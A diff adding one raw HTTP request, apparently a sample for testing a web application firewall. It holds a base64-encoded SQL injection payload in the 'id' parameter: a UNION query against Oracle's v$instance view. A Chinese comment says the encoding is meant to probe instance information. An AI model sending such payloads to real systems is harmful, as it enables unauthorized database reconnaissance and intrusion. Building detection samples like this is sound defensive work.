@@ -1,0 +1,9 @@
+# SQL注入_GET_oracle_查询实例数(Base64编码)
+# 攻击者基于UNION查询，将"union SELECT COUNT(*) AS instance_count FROM v$instance"语句进行base64编码注入到 SQL 查询参数中，利用系统视图v$instance获取当前数据库实例信息。
+GET /?id=MSB1bmlvbiBTRUxFQ1QgQ09VTlQoKikgQVMgaW5zdGFuY2VfY291bnQgRlJPTSB2JGluc3RhbmNl&bid=hd_tag_m8mv26gy HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26gy
+RM-PRO-Token: a64dc351c63bf2259ce854f3c77c8cd0
+RM-PRO-Time: 1742808618682
+User-Agent: curl/7.83.1
+
